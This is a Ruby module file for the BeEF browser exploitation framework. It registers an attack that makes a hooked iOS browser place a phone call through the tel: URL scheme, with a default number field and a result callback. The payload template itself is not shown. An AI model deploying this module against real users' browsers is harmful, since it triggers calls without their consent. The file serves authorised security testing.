module BeEF
module Modules
module Commands


class Iphone_tel < BeEF::Command

  #
  # Defines and set up the command module.
  #
  def initialize
    super({
      'Name' => 'iPhone Telephone URL',
      'Description' => 'This module will force the browser to attempt a skype 
      call. It will exploit the insecure handling of URL schemes in iOS.<br>
      <br>
      The protocol handler used will be: tel',
      'Category' => 'Host',
      'Author' => 'xntrik, Nitesh Dhanjani',
      'Data' =>
          [
              [   'name' => 'tel_num',
                  'ui_label'=>'Number',
                  'value' =>'5551234',
                  'width' => '200px'
              ],
          ],
      'File' => __FILE__,
      'Target' => {
        'browser_name' =>     BeEF::Constants::Browsers::S
      }
    })

    use 'beef.dom'
    use_template!
  end

  def callback
    content = {}
    content['Result'] = @datastore['result']
    save content

  end

end

end
end
end
